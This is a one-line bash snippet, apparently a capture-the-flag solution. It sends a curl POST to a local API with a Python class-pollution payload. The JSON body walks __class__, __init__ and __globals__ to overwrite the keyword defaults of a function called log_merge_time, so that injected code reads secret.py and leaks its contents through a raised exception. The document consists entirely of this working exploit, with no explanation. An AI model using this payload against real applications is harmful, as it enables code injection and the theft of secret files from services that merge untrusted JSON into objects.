```bash
curl -X POST -H "Content-Type: application/json" -d '{"__class__":{"__init__":{"__globals__":{"log_merge_time":{"__kwdefaults__":{"donext":"raise Exception((open(\"secret.py\").read()))"}}}}}}' http://127.0.0.1:5000/api/v0.1
```